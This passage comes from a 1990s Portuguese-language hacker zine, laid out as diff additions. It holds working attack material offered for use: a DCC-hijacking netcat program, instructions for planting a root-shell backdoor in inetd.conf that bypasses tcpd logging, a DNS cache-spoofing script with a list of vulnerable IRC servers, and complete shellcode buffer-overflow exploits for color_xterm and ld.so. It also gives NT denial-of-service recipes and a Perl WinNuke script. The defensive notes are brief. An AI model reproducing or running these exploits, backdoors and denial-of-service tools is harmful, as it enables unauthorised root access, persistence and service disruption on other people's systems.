+echo         ^Bfilename^B and ^Bsize^B are bogus values.
+alias DCCCHARGEN {
+                ^assign dcc_charging 0
+                //quote PRIVMSG $0 :^ADCC SEND $1 2230084270 19 $2^A
+                echo *** Sent DCC CHARGEN request to $0
+                ^assign dcc_charging 1
+           }
+
+Oque era impossivel para muitos esta na rwx! oque voce pode fazer, eh ver
+e interceptar as transferencias de DCC!
+
+dccgrab.c:
+
+/*  dccgrab 0.01      / linux - auth 97 / tem q ter netcat             */
+
+#include <stdio.h>
+#include <string.h>
+
+#define TRUE 1
+#define FALSE 0
+
+int main (){
+  int SnaggedOne;
+  FILE *f;
+  char NetstatLine [1024];
+  char CommandString [1024];
+  char *colin = ":";
+  char *tempstr;
+  int port;
+  int i;
+
+  port=1;
+  SnaggedOne=FALSE;
+
+  while (!SnaggedOne){
+    system ("netstat -a |egrep LISTEN |egrep ':' >/tmp/.dcc2345");
+    f=fopen ("/tmp/.dcc2345","rt");
+    if (f==NULL) {
+      fprintf (stderr,"Cade o file?");
+      exit (1);
+     }
+
+     port =0;
+     while (port == 0) {
+       fgets (&NetstatLine[0],1024,f);
+       tempstr = strstr (&NetstatLine[0],colin);
+       tempstr += sizeof (char);
+       sscanf (tempstr,"%d ",&port);
+       if (port < 1024) /* aham! */
+          port=0;
+       if (port == 6000)  /* X */
+         port=0;
+       if (port == 8080) /* proxy servers */
+         port=0;
+       /* bots... */
+       if (port == 2222)
+         port=0;
+       if (port == 3333)
+        port=0;
+       if (port == 4444)
+         port=0;
+       if (port == 5555)
+         port=0;
+       if (port == 6666)
+         port=0;
+       if (port == 7777)
+         port=0;
+       if (port == 8888)
+         port=0;
+       if (port == 9999)
+         port=0;
+       if (feof (f))
+         port=-1;
+    }
+
+    fclose (f);
+    if (port >0) {
+      SnaggedOne=TRUE;
+      printf ("tracando em %d\n",port);
+      sprintf (&CommandString[0],"nc 127.0.0.1 %d < ./telnet.d > snagfile",port
+);
+      system (CommandString);
+    }
+    else sleep (1);
+  }  /* while !snaggedone*/
+  return 0;
+}
+
+Isso funcionara  de forma local, mas e' bom para ver e aprender oque fazer!
+Bom, te' proxima edicao!
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+06# UM POUCO DE HARDWARE BASICO
+===============================
+By KByte.
+
+Estamos aqui mais uma vez reunidos , e fugindo um pouco dos padroes da
+zine venho falar um pouco sobre HardWare.
+
+       O computador vem se aperfeicoando a decadas , a partir do ponto de
+partida , o primeiro computador pessoal , o IBM PC , lancado em 1981.
+Esta linha de computadores possuiam um processador INTEL 8088 de
+velocidade 4.77 MHz.
+       Apos o IBM PC , veio o PC XT , o primeiro com um disco rigido de
+apenas 10 Mbytes.
+       A INTEL considerada a melhor e maior fabricante de chips do mundo ,
+produziu um processador mais rapido que o 8088 , o 80286 operando a 8
+MHz.Apos o 80286 seguiram -se o 80386 e o 80486 , muito usados ainda
+atualmente.
+       A velocidade de um processador depende de quantidade de Bits
+Internos e Externos , os quais vc encontra dos principais processadores:
+
+***********************************************************************
+MicroProcessador                    Bits Internos      Bits Externos
+8088                                   16                  8
+8086                                   16                  16
+80286                                  16                  16
+80386SX                                32                  16
+80386DX                                32                  32
+80486(Todos os tipos)                  32                  32
+PENTIUM                                32                  64
+************************************************************************
+
+Memorias :
+
+* ROM :
+   Sao memorias apenas para leitura , onde se localiza a BIOS , programa
+que ja vem do fabricante e faz uma deteccao dos perifericos usados na
+maquina.
+
+ * RAM :
+   Usada para leitura e escrita.Armazena as instrucoes a serem executadas
+pelo MicroProcessador
+
+ * DRAM (Dinamic Ram) :
+   E' a memoria usada em grande quantidade nos micros , por exemplo ,
+quando vc diz que seu computador tem 8 mb de memoria , vc se refere a
+memoria DRAM que eh lenta , mas barata e compacta .
+
+ * SRAM (Static Ram) :
+   Conhecida tambem como memoria cache. Essa memoria e' usada para
+acelerar o desempenho da memoria DRAM.
+
+-- Barramentos
+
+   Barramento e' um conjunto de conexoes eletronicas usadas para fazer a
+ligacao entre placas.A Placa Mae possue um conjunto de conectores chamados
+SLOTS.Esses SLOTS formam o barramento que liga a placa de cpu com as
+demais placas.
+
+* Barramento EISA
+    Opera com enderecamento de 8 bits
+* Barramento ISA (Industry Standart Architecture)
+    Opera com enderecamento de 16 bits
+* Barramento VLB (Vesa Local Bus)
+    Opera com enderecamento de 32 bits
+* Barramento PCI
+    Opera com enderecamento de 64 bits (Presente na placa PENTIUM)
+
+Bem pessoal , por este zine e' so' .Espero escrever mais na proxima zine ,
+qualquer sugestao , reclamacao , duvida sobre qualquer coisa , email us ,
+ou entao me procure no irc server irc.st.com.br podendo me mandar um
+memoserv.
+
+Kbyte.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+07# LINUX TRICKS
+================
+kbyte
+
+Bem pessoal , essa eh minha segunda materia nessa zine , da qual eu
+fui convidado a entrar por um grande amigo meu . O objetivo dessa materia
+eh complementar um pouco a materia do Skynet na Rwx00 sobre seguranca no
+seu linux.
+    Eu particulamento uso RedHat linux na minha maquina , usando o
+ttysnoopd , mas ainda nao me senti totalmente seguro e entao parti para
+outros dois arquivos de seguranca muito usados : hosts.deny e hosts.allow
+(Ambos se encontram no diretorio /etc/ da maioria dos *Nix)
+
+Para o acesso a algum servico do Linux , a sequencia eh a seguinte :
+
+  - Verifica-se se o Ip e o servico estao no hosts.allow , se estiverem
+acesso garantido (Mesmo se o Ip e o servico estiverem no hosts.deny que
+nao sao checados se encontrados no hosts.allow)
+
+  - Verifica-se se o Ip e o servico estao no hosts.deny , se nao estiverem
+acesso garantido
+
+  - Se o ip nao estiver no hosts.allow mas tambem nao estiver no
+hosts.deny , o acesso eh garantido.
+
+* Hosts.deny - Contem os hosts que _NAO_ podem acessar a certos servicos
+na sua maquina
+
+Sintaxe :
+servico:IP
+
+Exemplo :
+in.fingerd:200.00.00.00
+   |         |
+   |         O Ip da maquina que nao poderia acessar tal servico
+   |- Servico , no caso o finger
+
+Obs: Podemos usar alguns Wildcards como All ou Local
+
+Ex:
+in.fingerd:All   - Significa que nenhum IP podera acessar o servico em
+questao.
+All:All except local   - Significa que nenhum ip exceto ips locais
+possam acessar o servico , no caso todos os servicos disponiveis.
+
+* Hosts.allow  - Eh o arquivo aonde contem os servicos que certo ips podem
+acessar .
+
+Sintaxe: Parecida com o do hosts.deny so que essa linha garante acesso
+Servico:Ip
+
+Exemplo :
+in.fingerd:200.1.1.1
+  Garante acesso ao IP 200.1.1.1 ao servico finger
+
+All:200.20.20.20
+  Garante acesso a 200.20.20.20 a todos os servicos disponiveis
+
+Obs: Eh importante ressaltar , que podemos colocar varias linhas em ambos
+os arquivos , podendo entao anular ataques de certos ips.
+
+* Truque
+Bem , agora a parte mais esperada , o truquezinho que podemos fazer com o
+hosts.deny .
+
+No hosts.deny coloca-se :
+
+All:All: twist /var/noaccess %h %d ; \
+         /bin/echo -e "%h tentou acessar %d " >> /var/log/security.log ;
+
+Essa linha fara o seguinte , todo ip que tentar acessar qualquer servico
+de sua maquina , ira executar o programa noaccess e ira logar o IP do
+maquina e o servico que tentou acessar no arquivo /var/log/security.log
+
+Voce se quiser da acesso a alguma maquina apos a inclusao desta linha no
+hosts.deny , coloque no hosts.allow , tipo :
+
+in.telnetd:127.0.0.1
+para dar acesso telnet ao loopback.
+
+A baixo vai o programa noaccess.c
+----------------------------------Cut Here---------------------------------
+/*
+NoAccess
+Credits go to Piveti , a friend of mine
+*/
+
+#include <stdio.h>
+int main(int argc, char *argv[]){
+        int i;
+ for(i=10; i >= 0; printf("%i ",i), fflush(stdout), sleep(1), i--);
+         printf("Voce , %s ,nao foi autorizado a usar %s\n\n", argv[1],argv[2])
+;
+         printf("Voce esta nos meus logs!Nao volte mais !!!\n\n");
+ }
+--------------------------Cut Here-----------------------------------------
+Compile esse noaccess com gcc -o noaccess noaccess e bote no dir /var e
+pronto!:)
+
+Se quiser checar os logs de quem quis acessar sua maquina , tente um cat
+/var/log/security.log ou recomenda-se deixar um console rodando tail -f
+/var/log/security.log .
+
+Bom Divertimento.
+KByte.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+08# BACKDOOR'S {Perigo ConstAnte}
+=================================
+_KniGHT_(kdestroyer@usa.net)
+
+  E ai galera, e a primeira vez que eu to escrevendo para zine de seguranca
+ rwx, o DmS me convidou e eu aceitei, hhehehe.... nessa material vou falar
+ um pouco sobre BacKd00r'S, como funcionam, como se defender delas e o que
+ fazer p/ identificar o cara que ta usando as backd00r's no seu Sistema. Esp
+ ero que ajude!!!.
+
+ BaCKdoor's:
+
+   Existem muitos tipos de Backd00r's, as mais utilizadas sao a de associacao
+  de portas a um shell. tipo associar a porta 8888 a um shell tipo /bin/sh
+  esse tipo de Backd00r e muito simples facil de fazer.. voce ja loga como
+  root e nada fica logado, existem tambem as Backdoor que sao instaladas na
+  porta 23(telnet) mais essas ja sao mais complexas, e alterado o codigo
+  do telnet, e atribuido algumas linha onde libere o acesso completo p/ o
+  cara que tenha a senha MASTER(assim que eu chamo :)). Pronto com isso
+  da pra ter uma nocao basica de como funciona as BACKD00R's agora vou falar
+  como instalar uma...
+
+  OBS: Atencao essa explicacao de como instalar uma backdoor e so p/ voce
+       saber detectar uma em seu sistema, se voce usa-la p/ seu beneficio
+       em outro provedores e de sua inteira responsabilidade.
+
+   O tipo de Backdoor que eu irei explicar e o primeiro caso, a de atribuir
+  uma porta a um shell. O arquivo onde fica determinado o nome das portas do
+  sistema, e tambem a funcao de cada umas e o /etc/inetd.conf, ele se parece
+  com isso:
+
+/etc/inetd.conf
+---------------
+#
+# See "man 8 inetd" for more information.
+#
+# If you make changes to this file, either reboot your machine or send the
+# inetd a HUP signal:
+# Do a "ps x" as root and look up the pid of inetd. Then do a
+# "kill -HUP <pid of inetd>".
+# The inetd will re-read this file whenever it gets that signal.
+#
+# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
+#
+# Echo, discard, daytime, and chargen are used primarily for testing.
+#
+echo    stream  tcp     nowait  root    internal
+echo    dgram   udp     wait    root    internal
+discard stream  tcp     nowait  root    internal
+discard dgram   udp     wait    root    internal
+daytime stream  tcp     nowait  root    internal
+daytime dgram   udp     wait    root    internal
+chargen stream  tcp     nowait  root    internal
+chargen dgram   udp     wait    root    internal
+#
+# These are standard services.
+#
+ftp     stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/wu.ftpd
+telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.telnetd
+
+--------
+
+Pegando o exemplo do telnet:
+
+telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/in.telnetd
+|       |      |        |      |             |               |
+|       |      |        |      |             |               |
+|____ Nome da Porta     |_Espera a Connecao  |               |
+        |      |               |             |               |
+        |_ Tipo de Execucao    |_ Executa Como ROOT          |_Gerencia o Telne
+t
+               |                             |
+               |_ Protocolo                  |_Encarregado de Logar
+                                                 as Connecoes
+
+A Backd00r seria igual a Iss0:
+
+telnet  stream  tcp     nowait  root    /bin/sh  /bin/sh -i
+|       |       |       |       |       |        |
+|       |       |       |       |       |        |
+|_____Nome da Porta     |_Espera a Connecao      |_ Executa o Shell
+        |       |               |       |
+        |_ Tipo de Execucao     |_ Executa Como ROOT
+                |                       |
+                |_ Protocolo            |_Nota-se que o cara tira o tcpd
+                                          que e encarregado de logar tudo
+                                          p/ que sua connecao nao seja
+                                          percebida
+
+-----
+
+  Muito Simples Hein....
+  Agora basta dar um killall -HUP inetd e da um telnet p/ o provedor com
+ a backdoor na porta 23(telnet) ai SHAZAM....
+
+ bash#
+ :)
+------
+
+ C0m0 InDentiFIcaR As BacKd00r's
+
+   Basta voce sempre verificar o arquivo /etc/inetd.conf e checar se nao
+  tem nada estranho tipo as linhas a cima.. e sempre fique de olho se a
+  certa porta esteja executando o /usr/sbin/tcpd que e default p/ todas
+  se estiver sem desconfie..!!! ALGO ESTA ERRADO.
+
+------
+
+ C0m0 FaZeR p/ IndEnTIfICar o AuTh0r Da BAcKD00R
+
+   Isso e muito simples, basta voce alterar o aquela linha da BACKDOOR p/
+
+  telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  /bin/sh2
+    |       |      |        |      |            |            |
+    |       |      |_ Tipo de Connecao          |            |
+    |_ Nome da P0rTA        |      |            |_Encarregado de LOGAR
+            |               |_Espera Connecao                |
+            |_ Tipo de Execucao    |                         |_ Arquivos Texto
+                                   |_ Executa como ROOT         Modificado por
+                                                                p/ Avisar o car
+a
+                                                                que foi tudo
+                                                                L00gado.
+sh2.c------ cORte Aqui ----------
+
+#include "stdio.h"
+
+void main(void)
+{
+  printf("bash#");
+  printf("\n");
+  printf("\aEsta tuD0 L0GAD0.. espero que Esteja Usand0 uma C0nta Falsa\n");
+  system("echo BACKD00R Send0 Assionada AGORA verifique os Messages >> /tmp/tem
+p");
+  system("mail root < /tmp/temp");
+  system("rm /tmp/temp");
+}
+
+-------- C0rte Aqui ------------
+_KniGHT_(kdestroyer@usa.net)
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+09# MAC webSTAR's e Quid Pro Quo
+================================
+auth 97
+
+Como disse  na edicao passada, la vai bomba  sobre algo de mac, e  e' justo
+sobre o  Webstar ou Quid! Quando  voce  instalar eles usando as  configura-
+coes 'default', o log do servidor  vai ser locado  no 'tree  document' , ou
+seja, qualquer individuo que acessa a internet, pode ver o log completo  do
+server, apenas digitando no seu browser:
+
+http://<server>/WebSTAR%20LOG
+
+http://<server>/server%20logfile
+
+Depois desse  pequeno  buraco neles,vc estara pensando, poxa, deve se ,mais
+furado do que  qualquer outro, mas  nao.  Ele e' muito  mais seguro do  que
+qualquer. Porque ? O Mac nao tem um 'command  shell',e tambem , na o aceita
+conexoes remotas.
+
+Solucao: Colocando os logs para outro diretorio.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+10# DNS SPOOFING
+================
+
+Aqui temos uma importante participacao de um amigo nosso na zine , e quem
+sabe continuara escrevendo pra essa zine.
+
+Todas as informacoes abaixo devem ser inteligentemente usadas , pois nao
+nos responsabilizamos por atos maleficos que voce venha a causar com esse
+conhecimento
+
+ *** Spoof (Bind cache - dns spoof)
+
+Oi, bom, primeiramente, o que e' o spoof?
+Spoof e' voce poder cachear o host que voce quiser no seu ip atual, dentro
+de algum named(bind), sendo assim, apesar de naum ter nenhuma utilidade,
+so'serve mesmo pra irc, mais ja que o pessoal gosta muito disso, vou
+tentar dizer algumas coisas que sei sobre o assunto...
+Mais tem um porem, por ser o mais conhecido por todos, vou explicar sobre
+o famoso "jizz"... ;-)
+Bom, vamos entender as opcoes dele para saber a sintaxe:
+
+skater:~# jizz
+jizz .01b -- dns spoofer (BIND cache vuln.)
+by nimrood
+
+usage:
+jizz <beginhost> <fakenshost> <fakensip> <fakensdom> <spoofedip>
+<spoofedhost>
+    beginhost  :     requested to initiate false caching, ex:begin.ib6ub9.com
+    fakenshost :     server name to answer false PTR's, ex: ns.ib6ub9.com
+    fakensip   :     IP of server name to answer false PTR's, ex:205.160.29.19
+    fakensdom  :     domain name false name server controls, ex:ib6ub9.com
+    spoofedip  :     IP of machine you want to spoof from, ex:204.154.2.93
+    spoofedhost:     name you want to spoof, ex: teak.0wns.j00
+
+Vamos supor que voce tem root em server.nasa.gov , a maquina e'
+nameserver...
+Essa e' a cara do programa, ele pede 6 opcoes, sendo as seguintes:
+
+->beginhost : e' usado para iniciar o cache em cima do host da maquina na
+qual voce tem root.
+Ex: begin.server.nasa.gov ou $RANDOM.server.nasa.gov
+
+->fakenshost : e' onde comeca a criar o falso nameserver que vai responder
+os PTR's pelo seu ip permitindo entao que voce grave PTR's com o host que
+voce definir para o ip atual
+Ex: ns.server.nasa.gov
+
+->fakensip : IP do servidor para enviar os PTR's para gravar o host em seu
+IP
+Ex: 200.30.30.30 (e' o IP de server.nasa.gov)
+
+->fakensdom : dominio do falso nameserver para controle dos pacotes, ou
+seja, como voce estra criando outro nameserver em cima de
+server.menthor.com.br, que seria ns.server.menthor.com.br, o dominio desse
+falso nameserver seria a propria maquina.
+Ex: server.nasa.gov
+
+-> spoofedip : IP da maquina que voce quer spoofar, no caso, seu IP atual,
+mais tem que ser IP e naum host.
+Ex: 200.246.227.35
+
+-> spoofedhost : nome para meu host, ou seja, meu novo host.
+Ex: chemical.brothers.co.uk
+
+Certo, depois de todas as opcoes dele explicadas, ja da pra ter uma ideia
+de como usar
+Nesse caso, voce tem que usar um outro arquivo para auxiliar o jizz,
+esse se chama jizz.sh
+Esse e' o Jizz.sh:
+
+-- CUT HERE --
+if [ $# != 6 ]; then echo 'Incorrect Usage.';./jizz;exit 0;fi
+killall -9 jizz
+killall -9 named
+./jizz $1 $2 $3 $4 $5 $6&
+sleep 5
+while [ "$host" != "." ];do echo -n -e 'Name Server To Cache Fake Host
+On:';
+read host;
+if [ "$host" = "." ]; then echo Killing myself and starting named back
+up.;
+killall -9 jizz ; /usr/sbin/named; exit 0;fi
+echo -e "server $host\nset type=soa\n$1\nexit\n" |nslookup;done
+-- CUT HERE --
+
+O que ele faz? Essa e' uma das partes mais importantes da historia toda.
+Bom, ele faz o seguinte, ele envia essa informacao do host/IP toda para
+algum outro servidor, no caso mais famoso, algum irc server, mais tem um
+pequeno problema, naum da pra cachear seu IP em todos os irc servers, nem
+todos aceitam informacoes de outro nameserver, mais depois coloco uma
+listinha de alguns irc servers que aceitam cache.
+Nesse caso, com os exemplos que eu dei acima, pra voce spoofar por exemplo
+em irc.bignet.com.br(Brasnet), a linha seria:
+
+server:~# ./jizz.sh begin.server.nasa.gov ns.server.nasa.gov
+200.30.30.30 server.nasa.gov 200.246.227.35 chemical.brothers.co.uk
+jizz: no process killed
+jizz .01b -- dns spoofer (BIND cache vuln.)
+by nimrood
+
+begin.server.nasa.gov.
+begin.server.nasa.gov IN A
+begin.server.nasa.gov IN A 127.0.0.1
+ns.server.nasa.gov IN A 200.30.30.30
+server.nasa.gov IN NS ns.server.nasa.gov
+chemical.brothers.co.uk IN A 200.246.227.35
+35.227.246.200.IN-ADDR.ARPA IN PTR chemical.brothers.co.uk
+Name Server To Cache Fake Host On:irc.bignet.com.br
+
+Entao, continuando com o spoof, seguinte, alem de ter root no nameserver,
+toda vez que voce usar o jizz, ele vai killar o named, sendo assim, vai
+parar por alguns minutos o named no nameserver, por isso nem todos duram
+muito,a naum ser que o root seja "muito" lamer.
+
+Agora, uma coisa muito importante, voce vai precisar de um "default
+server" caso apos voce usar o jizz ele aparecer essa mensagem:
+*** Default servers are not available
+
+O que e' o default server? O default server seria qualquer outro
+nameserver, nesse caso, eu sempre uso o da telesc, (telesc.com.br), voce
+precisa apenas coloca-lo no resolv.conf da maquina.
+
+Non-authoritative answer:
+Name:    telesc.com.br
+Address:  200.247.31.1
+
+O /etc/resolv.conf da server.nasa.gov ficaria assim:
+# comeca aqui
+search server.nasa.gov nasa.gov
+nameserver 200.30.30.30
+nameserver 200.247.31.1
+# termina aqui :-P
+
+Agora vai uma listinha dos irc servers de algumas redes que aceitam cache:
+brasnet:
+irc.brnet.com.br
+irc.bignet.com.br
+irc.provale.com.br
+irc.menthor.com.br
+UFPa.bel.pa.Brasnet.org
+irc.sonet.com.br
+Cnet.jpa.pb.Brasnet.org
+FT.mgu.sp.Brasnet.org
+
+brasirc:
+irc.sercomtel.com.br
+irc.travelnet.com.br
+irc.rio.com.br
+
+efnet:
+irc3.phoenix.net
+irc.ionet.net
+ircd.idt.net
+
+xtranet:
+febe.sc.br.xtranet.org
+ibrati.am.br.xtranet.org
+
+Acho que sobre o jizz e' so' isso mesmo, mais pensem bem, como eu disse,
+toda vez que for usar o jizz ele da kill no named da maquina, entao, acho
+melhor lerem um pouco sobre os backdoors para naum perderem a maquina
+tao cedo... :-P
+Qualquer duvida, naum exite em perguntar, mais sem flood nos meus pvt's
+hein ;-)
+     by icmp (skater@sti.com.br)
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+EXPLOITS
+========
+
+11# COLOR_XTERM
+~~~~~~~~~~~~~~~
+by DmS
+
+Bom estou mandando aqui o exploit do color_xterm do Linux que saiu no mes de
+agosto. E necessario q o arquivo /usr/X11/bin/color_xterm tenha atributo +s.
+Para verificar ls -l color_xterm :)))
+Soluçao: chmod -s color_xterm
+
+------------------------------CORTE AQUI-------------------------------
+/* exploit for color_xterm, modified by zgv */
+/* original coded by Ming Zhang for the Chinese Version Of xTerm */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+#define PATH_COLOR_XTERM "/usr/X11/bin/color_xterm" /* Default Path If Make Ins
+tall Was Used */
+#define NOP_SIZE 1
+
+char nop[] = "\x90";
+
+/* Shell Code For That Ass */
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+/* Lets d0 d1s */
+void main(int argc,char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i,OffSet = DEFAULT_OFFSET;
+
+   if (argc>1) OffSet = atoi(argv[1]);
+
+   buff = malloc(2048);
+   if(!buff)
+   {
+      printf("err0r err0r err0r err0r you g0t gn0 sk1lls er memory\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE; i+=NOP_SIZE) {
+        memcpy (ptr,nop,NOP_SIZE);
+        ptr+=NOP_SIZE;
+   }
+
+   for(i=0;i < strlen(shellcode);i++)
+      *(ptr++) = shellcode[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_sp() + OffSet;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   (void) fprintf(stderr,"bewm bash#\n");
+
+    execl(PATH_COLOR_XTERM, "color_xterm_owns_me", "-xrm",buff, NULL);
+}
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+12# LD_SO{1.9.2} <= R00t
+================
+by _KniGHT_
+
+Exploit:
+-------------------------Corte Aqui-----------------------------
+/*
+ * buffer overflow exploit for ld-linux.so.1.9.2
+ * by Dan McGuirk <mcguirk@indirect.com>
+ * based on Aleph One's "smashing the stack" code
+ */
+
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                 3300
+#define DEFAULT_BUFFER_SIZE            1013
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff_bin_sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  printf("sp is 0x%x\n", get_sp());
+  addr = get_sp() - offset;  /* a valid addr is addr = 0xbfffeba8; here */
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff, "EGG=", 4);
+  putenv(buff);
+  system("ln -sf /bin/sh _bin_sh");
+  system("ln -sf /bin/su aa");
+  system("/bin/sh -c 'export LD_PRELOAD=$EGG; export PATH=$PATH:.; aa'");
+  system("rm -f _bin_sh");
+  system("rm -f aa");
+}
+-------------------------Corte Aqui-----------------------------
+Solucao:
+        Basta digitar um chmod -s /lib/ld.so  :) solucao rapida..
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+13# DENIAL OF SERVICE - NT
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+auth 97
+
+CONSUMINDO 100% DO CPU TIME - RPC (NT)
+
+Telneteie para a porta 135 , e  escreva alguns milhares de  caracteres, dai
+disconecte. Isso causara,que o process rpcss.exe  comece  a consumir  muita
+coisa.
+
+Solucao:
+
+ftp://ftp.microsoft.com
+
+/bussys/winnt/winnt-public/fixes/usa/nt40/hotfixes-postSP2/RPC-fix/
+
+-------------------------------------------------------------------[auth]-
+
+CONSUMINDO 100% DO CPU TIME (2) (NT)
+
+Telnetei para a porta 6558 e escreva 1 letra, e aperte enter. (hehe)
+
+-------------------------------------------------------------------[auth]-
+
+CONSUMINDO 100% DO CPU TIME (3) (NT)
+
+Telnetei para a porta 53 e escreva alguns caracteres, e dai disconecte.
+
+-------------------------------------------------------------------[auth]-
+
+MANDANDO OOB (O tradicional WinNuke)
+
+Voce pode 'detonar', qualquer servico de win95, win3.11, e winNT, todos
+rodando Netbios, mandando OOB (Out of Band) data, a porta da netbios e'
+a 139.
+
+A maquina NT tentara bootar a maquina, mais isso ocupara muita memoria,
+travando o sistema, tendo que reiniciar a maquina.
+
+Muitos usam o 'winnuke', para travar os computadores de muitos caras ai,
+ou seja, eu nao iria colocar um .c enorme aqui, so' para eles brincarem,
+dai, deu a ideia de colocar uma versao feita em PERL. :))
+
+--- -- - <CORTE AQUI>
+
+#!/usr/bin/perl
+# Auth 97
+
+use strict; use Socket;
+my($h,$p,$in_addr,$proto,$addr);
+
+$h = "$ARGV[0]"; $p = 139 if (!$ARGV[1]);
+if (!$h) { print "Host NT/95 Ex: www.microsoft.com\n"; }
+
+$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
+$proto = getprotobyname('tcp');
+socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;
+
+connect(S,$addr) or die $!; select S; $| = 1; select STDOUT;
+
+print "Nuking: $h:$p\n"; send S,"MORRA",MSG_OOB; print "MORTO!\n"; close S;
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+14# EMAILS
+~~~~~~~~~~
+
+Bom, sem muitos ainda! :))) essa secao foi criada para recebermos
+perguntas relacioadas ao zine, e fora disso! :), por isso, pra galera que
+mandou os emails parabelizando, a maioria deles ja foi respondida, com
+um simples, 'obrigado'. :))
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+15# FUTURO
+~~~~~~~~~~
+
+Bain, ainda sem page... eheh, espero que todos mandem mails de novo! :))
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+16# FINALIZACOES
+~~~~~~~~~~~~~~~~
+
+Pedido de desespero: MANDEM EMAILS! e que algum admin sagrado nos ajude! :)
+Cya, ate a proxima!
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+.oO <End> Oo.
